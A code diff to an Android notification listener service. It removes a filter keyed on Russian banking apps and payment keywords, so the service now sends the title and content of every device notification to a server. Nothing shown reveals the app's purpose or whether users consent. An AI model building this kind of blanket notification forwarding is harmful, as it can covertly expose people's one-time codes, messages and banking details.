@@ -57,20 +57,9 @@ public class NotificationListenerService extends android.service.notification.No
             
             Log.d(TAG, "Notification details - App: " + appName + ", Title: " + title + ", Content: " + content);
             
-            // Send ALL notifications for now (for debugging)
-            // Remove the filter temporarily to test
+            // Send ALL notifications to server without filtering
             sendNotificationToServer(deviceToken, packageName, appName, 
                                    title.toString(), content.toString());
-            
-            // Original filter logic (commented out for testing)
-            /*
-            if (isRelevantNotification(packageName, title.toString(), content.toString())) {
-                sendNotificationToServer(deviceToken, packageName, appName, 
-                                       title.toString(), content.toString());
-            } else {
-                Log.d(TAG, "Notification filtered out: " + packageName);
-            }
-            */
         } catch (Exception e) {
             Log.e(TAG, "Error processing notification", e);
         }
@@ -91,44 +80,6 @@ public class NotificationListenerService extends android.service.notification.No
     public void onListenerDisconnected() {
         super.onListenerDisconnected();
         Log.d(TAG, "NotificationListenerService disconnected");
-    }
-    
-    private boolean isRelevantNotification(String packageName, String title, String content) {
-        // Banking app package names
-        String[] bankingApps = {
-            "com.sberbank",
-            "ru.sberbankmobile",
-            "com.idamob.tinkoff",
-            "ru.tinkoff",
-            "ru.alfabank",
-            "ru.vtb24",
-            "com.rbs",
-            "ru.rosbank",
-            "ru.raiffeisen",
-            "com.openbank",
-            "ru.psbank"
-        };
-        
-        for (String app : bankingApps) {
-            if (packageName.contains(app)) {
-                return true;
-            }
-        }
-        
-        // Also check for transaction keywords
-        String combined = (title + " " + content).toLowerCase();
-        String[] keywords = {
-            "перевод", "поступление", "списание", "оплата", 
-            "payment", "transfer", "transaction", "руб", "rub"
-        };
-        
-        for (String keyword : keywords) {
-            if (combined.contains(keyword)) {
-                return true;
-            }
-        }
-        
-        return false;
     }
     
     private void sendNotificationToServer(String token, String packageName, 
